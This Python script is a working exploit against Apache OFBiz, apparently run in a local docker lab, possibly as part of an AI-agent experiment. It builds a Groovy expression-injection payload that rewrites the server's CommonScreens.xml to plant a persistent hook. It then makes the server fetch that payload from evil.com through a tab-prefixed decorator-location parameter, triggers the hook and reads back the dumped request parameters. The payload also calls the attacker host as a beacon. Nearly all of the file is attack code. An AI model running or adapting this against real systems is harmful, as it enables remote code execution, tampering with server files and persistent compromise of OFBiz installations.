# -*- coding: utf-8 -*-
"""Final round - OFBiz diagnostic: why does mainDecoratorLocation not fetch?

Augments the poisoned main-screen actions with a second <set> that dumps the
screen render context 'parameters' map to /usr/src/apache-ofbiz/pwn_joint_params.
Then replays GET main?mainDecoratorLocation=%09http://... and reads the dump.
Brace-free groovy throughout (expander truncates at first '}').
"""
import subprocess
import time

import requests
import urllib3

urllib3.disable_warnings()

WWW = r"D:\Amywork\AgentSelf_Evolve\experiment\multi-round-lab\infrastructure\www\payloads"
TARGET = "https://127.0.0.1:18381"
CB = "http://evil.com:8000/rt/"

OUTER = (
    "def f = new File('/usr/src/apache-ofbiz/framework/webtools/widget/CommonScreens.xml');"
    "def s = f.getText('UTF-8');"
    "def q = (char)39;"
    "def D = (char)34;"
    "def j = s.indexOf('joint_ofbiz_persist1');"
    "if (j > 0) "
    "if (s.indexOf('pwn_joint_params') < 0) "
    "if (s.indexOf('/>' , j) > 0) "
    "f.setText(s.substring(0, s.indexOf('/>', j) + 2) "
    "+ '<set value=' + D + '${groovy:' "
    "+ 'new File(' + q + '/usr/src/apache-ofbiz/pwn_joint_params' + q + ').setText(new java.util.Date() + ' + q + ' :: ' + q + ' + String.valueOf(parameters))' "
    "+ (char)125 + D + '/>' "
    "+ s.substring(s.indexOf('/>', j) + 2), 'UTF-8');"
    "new URL('" + CB + "joint_ofbiz_probe_params').getText();"
)
OUTER = OUTER.replace("<", "&lt;")

PROBE_XML = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n'
    '        xmlns="http://ofbiz.apache.org/Widget-Screen" '
    'xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen '
    'http://ofbiz.apache.org/dtds/widget-screen.xsd">\n'
    '    <screen name="TemporalExpressionDecorator">\n'
    '        <section>\n'
    '            <actions>\n'
    '                <set value="${groovy:' + OUTER + '}"/>\n'
    '            </actions>\n'
    '        </section>\n'
    '    </screen>\n'
    '</screens>\n')

with open(WWW + r"\joint_probe_params.xml", "w", encoding="utf-8", newline="\n") as fh:
    fh.write(PROBE_XML)
print("[payload] wrote joint_probe_params.xml")

s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"

r = s.post(TARGET + "/webtools/control/main/findTemporalExpression",
           data="tempExprDecoratorLocation=%09http://evil.com:8000/payloads/joint_probe_params.xml",
           headers={"Content-Type": "application/x-www-form-urlencoded"},
           timeout=90, allow_redirects=False)
print("[*] install probe -> HTTP", r.status_code)
time.sleep(2)

# fire the sister param again; the poisoned main actions now dump parameters
r = s.get(TARGET + "/webtools/control/main?mainDecoratorLocation=%09http://evil.com:8000/payloads/joint_sister1.xml",
          timeout=90, allow_redirects=False)
print("[*] replay sister GET -> HTTP", r.status_code)
time.sleep(2)

out = subprocess.run(
    ["docker", "exec", "multi-round-lab-ofbiz-1", "sh", "-c",
     "cat /usr/src/apache-ofbiz/pwn_joint_params 2>/dev/null | head -c 2000"],
    capture_output=True, text=True, errors="replace")
print("[dump]", (out.stdout + out.stderr).strip()[:2000])
